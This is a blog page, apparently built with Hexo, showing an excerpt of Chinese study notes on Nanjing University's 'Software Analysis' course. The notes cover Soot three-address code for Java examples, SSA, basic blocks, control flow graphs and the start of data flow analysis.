<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/2/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/2/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/02/01/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/">软件分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-02-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p>南京大学《软件分析》课程笔记</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1b7411K7P4/?spm_id_from=333.788&vd_source=1b73d83dc4431f8fc388b6891fa455ec" >南京大学《软件分析》课程01（Introduction）_哔哩哔哩_bilibili</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tai-e.pascal-lab.net/" >Tai-e (pascal-lab.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="一、Intermediate-Representation"   >
          <a href="#一、Intermediate-Representation" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、Intermediate-Representation" class="headerlink" title="一、Intermediate Representation"></a>一、Intermediate Representation</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104924393.png" alt="image-20230114104924393"></p>

        <h2 id="1-中间语言编译"   >
          <a href="#1-中间语言编译" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-中间语言编译" class="headerlink" title="1.中间语言编译"></a>1.中间语言编译</h2>
      
        <h3 id="1-过程"   >
          <a href="#1-过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-过程" class="headerlink" title="(1)过程"></a>(1)过程</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221228171253505.png" alt="image-20221228171253505"></p>
<ul>
<li>词法分析(<code>Lexical Analysis</code>)：从源代码到<code>Tokens</code>，检测单词是否正确</li>
<li>语法分析(<code>Syntax Analysis</code>)：从<code>Tokens</code>到<code>AST</code>，检测语法是否正确</li>
<li>语义分析(<code>Semantic Analysis</code>)：从<code>AST</code>到<code>Decorated AST</code>，检测语义或者说上下文，语境是否正确，比较复杂，一般在编程语言中不会涉及到，主要是自然语言才有的。</li>
<li>转换(<code>Translator</code>)：从<code>AST</code>到<code>IR</code>，即转换为三地址码，方便识别，最后生成机器码</li>
</ul>

        <h3 id="2-AST和IR"   >
          <a href="#2-AST和IR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-AST和IR" class="headerlink" title="(2)AST和IR"></a>(2)<code>AST</code>和<code>IR</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221228171835289.png" alt="image-20221228171835289"></p>
<p><code>IR</code>更利用静态分析，因为能够展现控制流程，语言无关性，更贴近于机器码。</p>

        <h2 id="2-Soot常见分析"   >
          <a href="#2-Soot常见分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Soot常见分析" class="headerlink" title="2.Soot常见分析"></a>2.<code>Soot</code>常见分析</h2>
      <p>从<code>JAVA</code>代码到<strong>三地址码</strong></p>

        <h3 id="For循环例子"   >
          <a href="#For循环例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#For循环例子" class="headerlink" title="For循环例子"></a><code>For</code>循环例子</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForLoop3AC</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)&#123;</span><br><span class="line">            x = x + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">	java.lang.String[] r0;</span><br><span class="line">    <span class="keyword">int</span> i1;</span><br><span class="line">    r0 := <span class="meta">@parameter0</span>: java.lang.String[]; <span class="comment">//参数类型的定义</span></span><br><span class="line">    </span><br><span class="line">    i1 = <span class="number">0</span>;		<span class="comment">//变量x</span></span><br><span class="line">    </span><br><span class="line">label1:			<span class="comment">//这里变量x和变量i被soot优化成一个变量i1了</span></span><br><span class="line">    <span class="keyword">if</span> i1 &gt;= <span class="number">10</span> goto label2;</span><br><span class="line">    </span><br><span class="line">    i1 = i1 + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    goto label1;</span><br><span class="line">   </span><br><span class="line">label2:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="do-while以及数组例子"   >
          <a href="#do-while以及数组例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#do-while以及数组例子" class="headerlink" title="do-while以及数组例子"></a><code>do-while</code>以及数组例子</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileLoop3AC</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">while</span>(arr[i] &lt; <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">	java.lang.String[] r0;</span><br><span class="line">    <span class="keyword">int</span>[] r1;</span><br><span class="line">    <span class="keyword">int</span> $i0,i1;</span><br><span class="line">    </span><br><span class="line">    r0 := <span class="meta">@parameter0</span>: java.lang.String[];<span class="comment">//参数类型定义</span></span><br><span class="line">    </span><br><span class="line">    r1 = newarray(<span class="keyword">int</span>)[<span class="number">10</span>]; <span class="comment">//array形式的赋值</span></span><br><span class="line">    </span><br><span class="line">    i1 = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">label1:</span><br><span class="line">    i1 = i1 + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    $i0 = r1[i1]; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> $i0 &lt; <span class="number">10</span> goto label1;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="函数调用例子"   >
          <a href="#函数调用例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数调用例子" class="headerlink" title="函数调用例子"></a>函数调用例子</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCall3AC</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">foo</span><span class="params">(String para1, String para2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> para1 + <span class="string">&quot; &quot;</span> + para2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MethodCall3AC mc = <span class="keyword">new</span> MethodCall3AC();</span><br><span class="line">        String result = mc.foo(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">java.lang.<span class="function">String <span class="title">foo</span><span class="params">(java.lang.String, java.lang.String)</span></span>&#123;</span><br><span class="line">    nju.sa.example.MethodCall3AC r0;</span><br><span class="line">    java.lang.String r1,r2,$r7;</span><br><span class="line">    java.lang.StringBuilder $r3,$r4,$r5,$r6;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//参数类型和函数名</span></span><br><span class="line">    r0 := <span class="meta">@this</span>: nju.sa.examples.MethodCall3AC;</span><br><span class="line">    r1 := <span class="meta">@parameter0</span>: java.lang.String;</span><br><span class="line">    r2 := <span class="meta">@parameter1</span>: java.lang.String;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一个String</span></span><br><span class="line">    $r3 = <span class="keyword">new</span> java.lang.StringBuilder;</span><br><span class="line">    specialinvoke $r3.&lt;java.lang.StringBuilder: <span class="keyword">void</span>&lt;init&gt;()&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用StringBuilder下的append,对应para1 + &quot; &quot; + para2</span></span><br><span class="line">    $r4 = virtualinvoke $r3.&lt;java.lang.StringBuilder: java.lang.<span class="function">StringBuilder <span class="title">append</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(r1)</span></span>;</span><br><span class="line">    $r5 = virtualinvoke $r4.&lt;java.lang.StringBuilder: java.lang.<span class="function">StringBuilder <span class="title">append</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(<span class="string">&quot; &quot;</span>)</span></span>;</span><br><span class="line">    $r6 = virtualinvoke $r5.&lt;java.lang.StringBuilder: java.lang.<span class="function">StringBuilder <span class="title">append</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(r2)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//完成之后需要toString来获取最终的变量</span></span><br><span class="line">    $r7 = virtualinvoke $r6.&lt;java.lang.StringBuilder: java.lang.<span class="function">String <span class="title">toString</span><span class="params">()</span>&gt;<span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $r7;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">    java.lang.String[] r0;</span><br><span class="line">    nju.sa.examples.MethodCall3AC $r3;</span><br><span class="line">    </span><br><span class="line">    r0 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一个MethodCall3Ac</span></span><br><span class="line">    $r3 = <span class="keyword">new</span> nju.sa.examples.MethodCall3Ac;</span><br><span class="line">    specialinvoke $r3.&lt;nju.sa.examples.MethodCall3Ac: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数调用</span></span><br><span class="line">    virtualinvoke $r3.&lt;nju.sa.examples.MethodCall3AC: java.lang.<span class="function">String <span class="title">foo</span><span class="params">(java.lang.String,java.lang.String)</span>&gt;<span class="params">(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里有个关于函数调用的知识点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221228180921880.png" alt="image-20221228180921880"></p>
<p>不同<code>invoke</code>在三地址码中代表调用不同的函数，是在<code>JVM</code>虚拟机中的一种表示。</p>
<ul>
<li>在<code>&lt;method signature&gt;</code>中的<code>method signture</code>通常结构为<code>class name: return type method name(parameter1 type)</code></li>
</ul>

        <h3 id="静态变量和类"   >
          <a href="#静态变量和类" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态变量和类" class="headerlink" title="静态变量和类"></a>静态变量和类</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Class3AC</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi = <span class="number">3.14</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">nju</span>.<span class="title">sa</span>.<span class="title">examples</span>.<span class="title">Class3AC</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()&#123;</span><br><span class="line">        nju.sa.examples.Class3AC r0;</span><br><span class="line">        </span><br><span class="line">        r0 := <span class="meta">@this</span>: nju.sa.examples.Class3AC;</span><br><span class="line">        </span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">        java.lang.String[] r0;</span><br><span class="line">        </span><br><span class="line">        r0 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//静态变量放在clinit函数中声明</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;clinit&gt;()&#123;</span><br><span class="line">        &lt;nju.sa.examples.Class3AC: <span class="keyword">double</span> pi&gt; = <span class="number">3.14</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-SSA-Static-Single-Assignment"   >
          <a href="#3-SSA-Static-Single-Assignment" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-SSA-Static-Single-Assignment" class="headerlink" title="3.SSA(Static Single Assignment)"></a>3.SSA(Static Single Assignment)</h2>
      <p>和三地址码<code>3AC</code>类似的一种表达方式，有优点也有缺点，但是大多用的是<code>3AC</code>，对于<code>SSA</code>区别如下</p>
<ul>
<li>每个定义的变量都有自己的不同名字</li>
<li>每个变量都有自己的定义</li>
</ul>
<p>比如</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229182529367.png" alt="image-20221229182529367"></p>
<p>如果有多的相同变量，则会有一个函数来判断，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229182112639.png" alt="image-20221229182112639"></p>
<p>即<code>X2 = ∅(X0,X1) </code>会用来判断值到底是哪个</p>

        <h2 id="4-基础块-Basic-Block"   >
          <a href="#4-基础块-Basic-Block" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-基础块-Basic-Block" class="headerlink" title="4.基础块(Basic Block)"></a>4.基础块(Basic Block)</h2>
      
        <h3 id="定义："   >
          <a href="#定义：" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3>
      <ul>
<li>只有一个入口指令，入口指令为第一个指令</li>
<li>只有一个出口指令，出口指令为最后一个指令</li>
<li>一个跳转目的点应该是一个<code>BB</code>的入口指令</li>
</ul>

        <h3 id="方法："   >
          <a href="#方法：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3>
      <p>如下为例子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229195930007.png" alt="image-20221229195930007"></p>
<ul>
<li><p>首先确定程序中入口</p>
<p>即**(1)**为入口</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229200108674.png" alt="image-20221229200108674"></p>
</li>
<li><p>然后确定跳转指令的目的地址，标记为<code>leader</code>，依据指令**(4)<strong>、</strong>(10)<strong>和</strong>(11)<strong>即可确定这里即为</strong>(3)<strong>、</strong>(7)<strong>和</strong>(12)**</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229200132805.png" alt="image-20221229200132805"></p>
</li>
<li><p>跳转指令后面的指令为一个<code>leader</code>，依据指令**(4)<strong>、</strong>(10)<strong>和</strong>(11)<strong>即可确定这里即为</strong>(5)、(11)、(12)**</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229200508572.png" alt="image-20221229200508572"></p>
</li>
<li><p>依据<code>leader</code>来划分<code>BB</code>，即一个<code>BB</code>应该是由一个<code>leader</code>到下一个<code>leader</code>之间的所有指令构成，不包括下一个<code>leader</code></p>
<ul>
<li><p><code>leaders</code>： <strong>(1), (3), (5), (7), (11), (12)</strong></p>
</li>
<li><p>划分<code>BB</code>：</p>
<ul>
<li><code>BB1</code>：**(1)~(2)**</li>
<li><code>BB2</code>：**(3)~(5)**</li>
<li><code>BB3</code>：**(5)~(6)**</li>
<li><code>BB4</code>：**(7)~(10)**</li>
<li><code>BB5</code>：**(11)**</li>
<li><code>BB6</code>：**(12)**</li>
</ul>
</li>
<li><p>得到最终<code>BB</code>结构</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229201021799.png" alt="image-20221229201021799"></p>
</li>
</ul>
</li>
</ul>

        <h2 id="5-CFG-Control-Flow-Graph"   >
          <a href="#5-CFG-Control-Flow-Graph" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-CFG-Control-Flow-Graph" class="headerlink" title="5.CFG(Control Flow Graph)"></a>5.CFG(Control Flow Graph)</h2>
      
        <h3 id="定义：-1"   >
          <a href="#定义：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h3>
      <ul>
<li>每个节点<code>node</code>为一个<code>BB</code></li>
<li>两个节点<code>node</code>之间只能有一条边</li>
</ul>

        <h3 id="方法：-1"   >
          <a href="#方法：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3>
      <ul>
<li><p>首先跳转指令的跳转目的地址都修改为对应的<code>BB</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229201645109.png" alt="image-20221229201645109"></p>
</li>
<li><p>然后依据跳转指令，将对应跳转进行连边，即得到</p>
<p><code>B2-&gt;B4</code>、<code>B4-&gt;B6</code>、<code>B5-&gt;B2</code>三条边</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229201736630.png" alt="image-20221229201736630"></p>
</li>
<li><p>从程序入口到程序出口间所有的<code>BB</code>，由上至下两两添加一条边，除了包含无条件跳转的<code>BB</code>，那么得到</p>
<p><code>B1-&gt;B2</code>、<code>B2-&gt;B3</code>、<code>B3-&gt;B4</code>、<code>B4-&gt;B5</code>四条边，由于<code>B5</code>出口指令为无条件跳转，所以<code>B5-&gt;B6</code>没有边，得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229202220689.png" alt="image-20221229202220689"></p>
</li>
<li><p>依据边的方向，得到各个<code>BB</code>之间的前驱后继的关系</p>
</li>
<li><p>加入<code>Entry</code>和<code>Exit</code>，得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229202406452.png" alt="image-20221229202406452"></p>
</li>
</ul>

        <h1 id="二、Data-Flow-Analysis-I"   >
          <a href="#二、Data-Flow-Analysis-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、Data-Flow-Analysis-I" class="headerlink" title="二、Data Flow Analysis I"></a>二、Data Flow Analysis I</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104952338.png" alt="image-20230114104952338"></p>
<p>即数据(DATA)在CFG(Control Flow Graph)中<code>Flow</code>的过程分析</p>

        <h2 id="1-基本概念"   >
          <a href="#1-基本概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2>
      
        <h3 id="常见符号"   >
          <a href="#常见符号" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3>
      <ul>
<li><p>抽象符号</p>
<ul>
<li><p><code>⊥</code>：未定义</p>
</li>
<li><p><code>+、-</code>：常见正负表示</p>
</li>
<li><p><code>0</code>：即零</p>
</li>
</ul>
</li>
</ul>

        <h3 id="IN-S-和OUT-S"   >
          <a href="#IN-S-和OUT-S" class="heading-link"><i class="fas fa-link"></i></a><a href="#IN-S-和OUT-S" class="headerlink" title="IN[S]和OUT[S]"></a>IN[S]和OUT[S]</h3>
      <p>一个<code>IR</code>语句的输入数据集合以及输出数据集合，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230101356151.png" alt="image-20221230101356151"></p>
<p>然后也区分几种状况，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230101529915.png" alt="image-20221230101529915"></p>
<ul>
